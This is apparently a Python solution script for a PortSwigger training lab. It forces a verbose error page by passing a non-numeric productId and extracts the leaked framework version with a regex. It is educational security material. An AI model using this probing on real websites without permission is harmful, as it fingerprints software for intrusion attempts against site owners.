# Lab 01 — Information disclosure in error messages
# PortSwigger: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages
#
# Vulnerability: Verbose error messages reveal the exact version of a
#                third-party framework in use, but only when the productId
#                parameter is a NON-NUMERIC value (the "does not exist"
#                case is handled cleanly, but "wrong type entirely" falls
#                through to the framework's own default error page)
# Aim:           Obtain the version number of the vulnerable framework
#
# Technique:
#   GET /product?productId=999999  → clean 404 (handled)
#   GET /product?productId=null    → 500, verbose stack trace with the
#                                     framework name and version
#
# Usage: python information_disclosure_lab01.py <url>

import sys
import re
import urllib3
from proxies import proxies
from information_disclosure_utils import banner, section, make_session, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 01 — INFORMATION DISCLOSURE IN ERROR MESSAGES")

    if len(sys.argv) != 2:
        print("  Usage: python information_disclosure_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm the "clean" handled case ──────────────────────────
    print("  ── Step 1: confirm a non-existent (but numeric) ID is handled cleanly\n")
    r_numeric = session.get(f"{url}/product", params={"productId": "999999"})
    print(f"  ℹ  productId=999999 → status {r_numeric.status_code} (expected 404, no leak)\n")

    # ── Step 2: trigger the verbose error with a non-numeric value ──────────
    print("  ── Step 2: trigger the unhandled error path with a non-numeric value\n")
    r_leak = session.get(f"{url}/product", params={"productId": "null"})
    print(f"  ℹ  productId=null → status {r_leak.status_code}\n")

    # ── Step 3: extract the framework version from the stack trace ──────────
    version_match = re.search(
        r'(Apache Struts|Spring|Django|Rails|Laravel|Express)[^\n<]{0,60}?(\d+\.\d+(\.\d+)?)',
        r_leak.text
    )

    if version_match:
        framework_info = version_match.group(0).strip()
        print_box("Disclosed framework version", framework_info)
    else:
        print("  ?  Could not auto-extract a version string — inspect the")
        print("     raw response below for the framework name/version manually.")
        print_box("Raw error response (truncated)", r_leak.text[:1200])
